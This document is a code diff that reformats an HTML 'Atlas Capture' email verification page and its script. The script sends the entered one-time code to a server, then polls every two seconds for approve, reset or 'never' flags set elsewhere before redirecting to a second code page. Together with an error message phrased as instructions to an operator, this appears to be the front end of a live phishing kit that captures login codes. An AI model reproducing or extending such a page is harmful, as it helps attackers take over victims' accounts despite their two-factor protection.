@@ -1,351 +1,375 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Atlas Capture - Verify Code</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Atlas Capture - Verify Code</title>
 
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
 
-<style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif}
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Inter, sans-serif
+        }
 
-body{
-  background: white;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  min-height:100vh;
-  padding:40px 10px;
-}
+        body {
+            background: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 40px 10px;
+        }
 
-.wrapper{max-width:420px;width:100%}
+        .wrapper {
+            max-width: 420px;
+            width: 100%
+        }
 
-.header{
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  gap:10px;
-  margin-bottom:18px;
-}
-.header span{font-weight:600;font-size:18px; color: #1f2937;}
+        .header {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 18px;
+        }
 
-.card{
-  background: white;
-  border-radius:22px;
-  padding:4px 22px;
-  text-align:center;
-}
+        .header span {
+            font-weight: 600;
+            font-size: 18px;
+            color: #1f2937;
+        }
 
-.otp-icon{
-  width:64px;
-  height:64px;
-  background:#eef2ff;
-  border-radius:32px;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  margin:0 auto 20px;
-}
-.otp-icon svg{
-  width:32px;
-  height:32px;
-  stroke:#4f46e5;
-}
+        .card {
+            background: white;
+            border-radius: 22px;
+            padding: 4px 22px;
+            text-align: center;
+        }
 
-h2{
-  font-size:24px;
-  font-weight:700;
-  color:#1f2937;
-  margin-bottom:8px;
-}
+        .otp-icon {
+            width: 64px;
+            height: 64px;
+            background: #eef2ff;
+            border-radius: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+        }
 
-.subtext{
-  color:#6b7280;
-  font-size:14px;
-  margin-bottom:28px;
-}
+        .otp-icon svg {
+            width: 32px;
+            height: 32px;
+            stroke: #4f46e5;
+        }
 
-.otp-single-input {
-  width: 100%;
-  padding: 12px 50px;
-  font-size: 24px;
-  font-weight: 600;
-  text-align: center;
-  letter-spacing: 12px;
-  border: 2px solid #e5e7eb;
-  border-radius: 14px;
-  background: #fff;
-  transition: all 0.2s;
-  font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
-  margin-bottom: 20px;
-}
+        h2 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1f2937;
+            margin-bottom: 8px;
+        }
 
-.otp-single-input:focus {
-  outline: none;
-  border-color: #4f46e5;
-  box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
-}
+        .subtext {
+            color: #6b7280;
+            font-size: 12px;
+            margin-bottom: 28px;
+        }
 
-.otp-single-input:disabled {
-  background: #f3f4f6;
-  cursor: not-allowed;
-}
+        .otp-single-input {
+            width: 100%;
+            font-size: 12px;
+            text-align: center;
+            border: 2px solid #e5e7eb;
+            border-radius: 8px;
+            background: #fff;
+            transition: all 0.2s;
+            font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
+            margin-bottom: 20px;
+            padding: 4px;
+        }
 
-.otp-single-input::placeholder {
-  color: #cbd5e1;
-  letter-spacing: 12px;
-  font-size: 24px;
-  font-weight: 600;
-  text-align: center;
-  opacity: 0.6;
-}
+        .otp-single-input:focus {
+            outline: none;
+            border-color: #4f46e5;
+            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
+        }
 
-button{
-  width:100%;
-  padding:14px;
-  border-radius:12px;
-  border:none;
-  background:linear-gradient(90deg,#2563eb,#7c3aed);
-  color:#fff;
-  font-weight:600;
-  cursor:pointer;
-  margin-bottom:16px;
-}
-button:disabled{
-  opacity:0.6;
-  cursor:not-allowed;
-}
-.button-loading{
-  display:inline-flex;
-  align-items:center;
-  gap:8px;
-}
-.spinner{
-  width:18px;
-  height:18px;
-  border:2px solid rgba(255,255,255,0.3);
-  border-top-color:white;
-  border-radius:50%;
-  animation:spin 0.8s linear infinite;
-}
-@keyframes spin{
-  to{transform:rotate(360deg);}
-}
+        .otp-single-input:disabled {
+            background: #f3f4f6;
+            cursor: not-allowed;
+        }
 
-.link{
-  background:none;
-  color:#4f46e5;
-  font-size:14px;
-  font-weight:500;
-  margin:0;
-  padding:0;
-  box-shadow:none;
-}
-.link:hover{
-  background:none;
-  text-decoration:underline;
-}
+        .otp-single-input::placeholder {
+            color: #cbd5e1;
+            letter-spacing: 12px;
+            font-size: 12px font-weight: 600;
+            text-align: center;
+            opacity: 0.6;
+        }
 
-.error-message{
-  color:#ef4444;
-  font-size:12px;
-  margin-top:12px;
-  margin-bottom:8px;
-  display:none;
-  line-height:1.4;
-}
+        button {
+            width: 100%;
+            padding: 14px;
+            border-radius: 12px;
+            border: none;
+            background: linear-gradient(90deg, #2563eb, #7c3aed);
+            color: #fff;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 16px;
+        }
 
-.incorrect-message{
-  color:#ef4444;
-  font-size:11px;
-  margin-top:8px;
-  margin-bottom:12px;
-  display:none;
-  line-height:1.5;
-  text-align:center;
-  background:#fef2f2;
-  padding:10px;
-  border-radius:12px;
-  border:1px solid #fecaca;
-}
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
 
-#logoAtlas{
-  height: 45px;
-  width: 45px;
-  border-radius: 40%;
-  margin-right: 9px;
-}
-</style>
+        .button-loading {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .link {
+            background: none;
+            color: #4f46e5;
+            font-size: 14px;
+            font-weight: 500;
+            margin: 0;
+            padding: 0;
+            box-shadow: none;
+        }
+
+        .link:hover {
+            background: none;
+            text-decoration: underline;
+        }
+
+        .error-message {
+            color: #ef4444;
+            font-size: 12px;
+            margin-top: 12px;
+            margin-bottom: 8px;
+            display: none;
+            line-height: 1.4;
+        }
+
+        .incorrect-message {
+            color: #ef4444;
+            font-size: 11px;
+            margin-top: 8px;
+            margin-bottom: 12px;
+            display: none;
+            line-height: 1.5;
+            text-align: center;
+            background: #fef2f2;
+            padding: 10px;
+            border-radius: 12px;
+            border: 1px solid #fecaca;
+        }
+
+        #logoAtlas {
+            height: 30px;
+            width: 30;
+            border-radius: 25%;
+            margin-right: 9px;
+        }
+    </style>
 </head>
+
 <body>
 
-<div class="wrapper">
-  <div class="header">
-    <div class="icon">
-      <img id="logoAtlas" src="https://i.postimg.cc/dQjyw0ZV/atlas.png" alt="atlas logo">
+    <div class="wrapper">
+        <div class="header">
+            <div class="icon">
+                <img id="logoAtlas" src="https://i.postimg.cc/dQjyw0ZV/atlas.png" alt="atlas logo">
+            </div>
+            <span>Atlas Capture</span>
+        </div>
+
+        <div class="card">
+            <h4>Check your email</h4>
+            <p class="subtext">We sent you a 6-character verification code</p>
+            <label
+                style="font-weight: 400; color: purple; align-self: start; text-align: left !important; display: block; width: 100%; margin-bottom: 8px;">Verification
+                code</label>
+            <input type="text" class="otp-single-input" id="otpInput" maxlength="6" inputmode="numeric" pattern="[0-9]*"
+                placeholder="000000">
+
+            <div id="incorrectMessage" class="error-message"></div>
+            <div id="errorMessage" class="error-message"></div>
+
+            <button id="verifyBtn">Verify</button>
+            <button class="link" id="differentEmail">Use a different email</button>
+        </div>
     </div>
-    <span>Atlas Capture</span>
-  </div>
 
-  <div class="card">
-    <h2>Check your email</h2>
-    <p class="subtext">We sent you a 6-character verification code</p>
-    <label style="font-weight: 400; color: purple; align-self: start; text-align: left !important; display: block; width: 100%; margin-bottom: 8px;">Verification code</label>
-    <input type="text" class="otp-single-input" id="otpInput" maxlength="6" inputmode="numeric" pattern="[0-9]*" placeholder="000000">
+    <script>
+        const pathParts = window.location.pathname.split('/');
+        const email = decodeURIComponent(pathParts[2]);
+        if (!email) window.location.href = '/';
 
-    <div id="incorrectMessage" class="error-message"></div>
-    <div id="errorMessage" class="error-message"></div>
-    
-    <button id="verifyBtn">Verify</button>
-    <button class="link" id="differentEmail">Use a different email</button>
-  </div>
-</div>
+        const otpInput = document.getElementById('otpInput');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const errorDiv = document.getElementById('errorMessage');
+        const incorrectDiv = document.getElementById('incorrectMessage');
+        let isProcessing = false;
+        let checkInterval = null;
 
-<script>
-  const pathParts = window.location.pathname.split('/');
-  const email = decodeURIComponent(pathParts[2]);
-  if (!email) window.location.href = '/';
+        otpInput.addEventListener('input', (e) => {
+            let value = e.target.value;
+            value = value.replace(/[^0-9]/g, '');
+            e.target.value = value;
 
-  const otpInput = document.getElementById('otpInput');
-  const verifyBtn = document.getElementById('verifyBtn');
-  const errorDiv = document.getElementById('errorMessage');
-  const incorrectDiv = document.getElementById('incorrectMessage');
-  let isProcessing = false;
-  let checkInterval = null;
+            if (value.length === 6 && !isProcessing) {
+                verifyBtn.disabled = false;
+            } else if (value.length !== 6) {
+                verifyBtn.disabled = true;
+            }
+        });
 
-  otpInput.addEventListener('input', (e) => {
-    let value = e.target.value;
-    value = value.replace(/[^0-9]/g, '');
-    e.target.value = value;
-    
-    if (value.length === 6 && !isProcessing) {
-      verifyBtn.disabled = false;
-    } else if (value.length !== 6) {
-      verifyBtn.disabled = true;
-    }
-  });
-  
-  otpInput.addEventListener('keypress', (e) => {
-    const charCode = e.which ? e.which : e.keyCode;
-    if (charCode < 48 || charCode > 57) {
-      e.preventDefault();
-    }
-  });
-  
-  otpInput.addEventListener('paste', (e) => {
-    e.preventDefault();
-    const pasted = (e.clipboardData || window.clipboardData).getData('text');
-    const numbers = pasted.replace(/[^0-9]/g, '');
-    const limited = numbers.slice(0, 6);
-    otpInput.value = limited;
-    
-    if (limited.length === 6 && !isProcessing) {
-      verifyBtn.disabled = false;
-    }
-  });
+        otpInput.addEventListener('keypress', (e) => {
+            const charCode = e.which ? e.which : e.keyCode;
+            if (charCode < 48 || charCode > 57) {
+                e.preventDefault();
+            }
+        });
 
-  function getOTP() {
-    const otp = otpInput.value;
-    if (!otp || otp.length !== 6) return null;
-    return otp;
-  }
+        otpInput.addEventListener('paste', (e) => {
+            e.preventDefault();
+            const pasted = (e.clipboardData || window.clipboardData).getData('text');
+            const numbers = pasted.replace(/[^0-9]/g, '');
+            const limited = numbers.slice(0, 6);
+            otpInput.value = limited;
 
-  function showLoading() {
-    isProcessing = true;
-    verifyBtn.disabled = true;
-    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
-    errorDiv.style.display = 'none';
-    incorrectDiv.style.display = 'none';
-  }
+            if (limited.length === 6 && !isProcessing) {
+                verifyBtn.disabled = false;
+            }
+        });
 
-  function showIncorrectMessage() {
-    isProcessing = false;
-    verifyBtn.disabled = false;
-    verifyBtn.innerHTML = 'Verify';
-    incorrectDiv.innerHTML = 'The passcode was incorrect and could not be authenticated, encourage the user to try inputting the passcode again or send another passcode';
-    incorrectDiv.style.display = 'block';
-    
-    otpInput.value = '';
-    otpInput.disabled = false;
-    otpInput.focus();
-  }
-
-  async function verifyOTP() {
-  if (isProcessing) return;
-  const otp = getOTP();
-  if (!otp || otp.length !== 6) {
-    errorDiv.textContent = 'Please enter all 6 digits';
-    errorDiv.style.display = 'block';
-    setTimeout(() => {
-      errorDiv.style.display = 'none';
-    }, 3000);
-    return;
-  }
-
-  showLoading();
-  try {
-    const response = await fetch('/api/users/submit-otp', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ email, otp })
-    });
-    const data = await response.json();
-    
-    if (data.success) {
-      if (checkInterval) clearInterval(checkInterval);
-      checkInterval = setInterval(async () => {
-        try {
-          const statusResponse = await fetch(`/api/users/check-otp-status?email=${encodeURIComponent(email)}`);
-          const statusData = await statusResponse.json();
-          
-          if (statusData.reset) {
-            clearInterval(checkInterval);
-            showIncorrectMessage();
-            checkInterval = null;
-          } else if (statusData.never === true) {
-            clearInterval(checkInterval);
-            window.location.href = `/success?email=${encodeURIComponent(email)}`;
-            checkInterval = null;
-          } else if (statusData.approved === true) {
-            clearInterval(checkInterval);
-            window.location.href = `/otp2/${encodeURIComponent(email)}/`;
-            checkInterval = null;
-          }
-        } catch(e) {
-          console.log('Checking status...', e);
-        }
-      }, 2000);
-    } else {
-      isProcessing = false;
-      verifyBtn.disabled = false;
-      verifyBtn.innerHTML = 'Verify';
-      errorDiv.textContent = data.error || 'Invalid OTP';
-      errorDiv.style.display = 'block';
-      setTimeout(() => {
-        errorDiv.style.display = 'none';
-      }, 3000);
-    }
-  } catch (error) {
-    isProcessing = false;
-    verifyBtn.disabled = false;
-    verifyBtn.innerHTML = 'Verify';
-    errorDiv.textContent = 'Network error. Please try again.';
-    errorDiv.style.display = 'block';
-    setTimeout(() => {
-      errorDiv.style.display = 'none';
-    }, 3000);
-  }
+        function getOTP() {
+            const otp = otpInput.value;
+            if (!otp || otp.length !== 6) return null;
+            return otp;
         }
 
-  verifyBtn.addEventListener('click', verifyOTP);
-  otpInput.focus();
-  document.getElementById('differentEmail').addEventListener('click', () => {
-    if (checkInterval) clearInterval(checkInterval);
-    window.location.href = '/';
-  });
-</script>
+        function showLoading() {
+            isProcessing = true;
+            verifyBtn.disabled = true;
+            verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
+            errorDiv.style.display = 'none';
+            incorrectDiv.style.display = 'none';
+        }
+
+        function showIncorrectMessage() {
+            isProcessing = false;
+            verifyBtn.disabled = false;
+            verifyBtn.innerHTML = 'Verify';
+            incorrectDiv.innerHTML = 'The passcode was incorrect and could not be authenticated, encourage the user to try inputting the passcode again or send another passcode';
+            incorrectDiv.style.display = 'block';
+
+            otpInput.value = '';
+            otpInput.disabled = false;
+            otpInput.focus();
+        }
+
+        async function verifyOTP() {
+            if (isProcessing) return;
+            const otp = getOTP();
+            if (!otp || otp.length !== 6) {
+                errorDiv.textContent = 'Please enter all 6 digits';
+                errorDiv.style.display = 'block';
+                setTimeout(() => {
+                    errorDiv.style.display = 'none';
+                }, 3000);
+                return;
+            }
+
+            showLoading();
+            try {
+                const response = await fetch('/api/users/submit-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, otp })
+                });
+                const data = await response.json();
+
+                if (data.success) {
+                    if (checkInterval) clearInterval(checkInterval);
+                    checkInterval = setInterval(async () => {
+                        try {
+                            const statusResponse = await fetch(`/api/users/check-otp-status?email=${encodeURIComponent(email)}`);
+                            const statusData = await statusResponse.json();
+
+                            if (statusData.reset) {
+                                clearInterval(checkInterval);
+                                showIncorrectMessage();
+                                checkInterval = null;
+                            } else if (statusData.never === true) {
+                                clearInterval(checkInterval);
+                                window.location.href = `/success?email=${encodeURIComponent(email)}`;
+                                checkInterval = null;
+                            } else if (statusData.approved === true) {
+                                clearInterval(checkInterval);
+                                window.location.href = `/otp2/${encodeURIComponent(email)}/`;
+                                checkInterval = null;
+                            }
+                        } catch (e) {
+                            console.log('Checking status...', e);
+                        }
+                    }, 2000);
+                } else {
+                    isProcessing = false;
+                    verifyBtn.disabled = false;
+                    verifyBtn.innerHTML = 'Verify';
+                    errorDiv.textContent = data.error || 'Invalid OTP';
+                    errorDiv.style.display = 'block';
+                    setTimeout(() => {
+                        errorDiv.style.display = 'none';
+                    }, 3000);
+                }
+            } catch (error) {
+                isProcessing = false;
+                verifyBtn.disabled = false;
+                verifyBtn.innerHTML = 'Verify';
+                errorDiv.textContent = 'Network error. Please try again.';
+                errorDiv.style.display = 'block';
+                setTimeout(() => {
+                    errorDiv.style.display = 'none';
+                }, 3000);
+            }
+        }
+
+        verifyBtn.addEventListener('click', verifyOTP);
+        otpInput.focus();
+        document.getElementById('differentEmail').addEventListener('click', () => {
+            if (checkInterval) clearInterval(checkInterval);
+            window.location.href = '/';
+        });
+    </script>
 
 </body>
+
 </html>
